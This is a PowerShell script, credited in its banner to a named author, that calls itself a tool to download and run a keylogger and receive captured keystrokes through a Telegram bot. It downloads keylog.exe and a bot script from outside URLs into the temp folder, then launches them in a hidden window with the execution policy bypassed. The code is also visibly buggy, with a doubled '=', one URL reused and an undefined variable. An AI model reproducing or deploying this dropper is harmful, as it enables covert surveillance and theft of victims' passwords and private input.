#################################################################
#.___________..______       __  ___   ___ ... PWENED
#|           ||   _  \     |  | \  \ /  / 
#`---|  |----`|  |_)  |    |  |  \  V  /  
#    |  |     |      /     |  |   >   <   
#    |  |     |  |\  \----.|  |  /  .  \  
#    |__|     | _| `._____||__| /__/ \__\ ... PWENED
#    
#POWERSHELL SCRIPT TO DOWNLOAD AND EXECUTE KEYLOGGER AND RECIEVES THE OUTPUT VIA TELEGRAM BOT 
#EXECUTION TIME 0.7 SECONDS
#CODED BY SMUKX
#GITHUB: https://github.com/Whitecat18
#BLOG: https://smukx.github.io
##################################################################


# Define the URL of the executable file to download
$url = = "https://raw.githubusercontent.com/Whitecat18/Ps-script-for-Hackers-and-Pentesters/main/scripts/keylog.exe"
# Download and modify telebot-ps1 and create a new link for that . 
$url1 = "https://example.com/tele-bot.ps1"


# Define the path where the executable file will be saved
$tempPath = "$env:TEMP\keylog.exe"
$tempPath1 = "$env:TEMP\tele-bot.ps1"


# Download the executable file from the URL
Invoke-WebRequest -Uri $url -OutFile $tempPath
Invoke-WebRequest -Uri $url -OutFile $tempPath1

# Check if the executable file was downloaded successfully
if (Test-Path $tempPath) {
    # Define the path to the PowerShell script that will run the executable file
    $scriptPath = "$env:TEMP\run-myapp.ps1"

    
    # Create the PowerShell script that will run the executable file and powershell 
    Set-Content -Path $scriptPath -Value "Start-Process $tempPath"
    Start-Process powershell.exe "$tempPath1" -WindowStyle Hidden
    
    PowerShell.exe -ExecutionPolicy Bypass -File $scriptPath
    PowerShell.exe -ExecutionPolicy Bypass -File $scriptPath1
} else 

{
    Write-Error "Failed to download keylog.exe"
}
